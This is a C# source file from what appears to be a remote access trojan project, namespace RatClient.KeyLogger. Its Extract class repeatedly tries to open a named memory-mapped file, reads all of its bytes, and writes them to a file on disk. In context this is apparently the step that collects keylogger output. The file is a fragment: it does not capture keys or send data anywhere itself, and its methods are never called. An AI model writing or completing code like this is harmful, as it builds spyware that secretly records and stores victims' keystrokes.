using System.IO.MemoryMappedFiles;
using System.Threading;
using System.IO;


namespace RatClient.KeyLogger
{
    class Extract
    {
        static MemoryMappedFile GetMMF(string name)
        {
            int c = 0;
            MemoryMappedFile mmf;
            while (c < 125)
            {
                try
                {
                    mmf = MemoryMappedFile.OpenExisting(name);
                    return mmf;
                }
                catch
                {
                    Thread.Sleep(40);
                }
                c += 1;
            }
            return null;
        }

        static byte[] ExtractData(MemoryMappedViewAccessor view)
        {
            byte[] byteData = new byte[view.Capacity];
            view.ReadArray(0, byteData, 0, (int)view.Capacity);
            view.Dispose();
            return byteData;
        }

        static bool WriteRes(string path, byte[] data)
        {
            string dir = Path.GetDirectoryName(path);
            if (!Directory.Exists(dir))
            {
                return false;
            }
            else
            {
                try
                {
                    File.WriteAllBytes(path, data);
                }
                catch
                {
                    return false;
                }
            }
            return true;
        }
    }
}
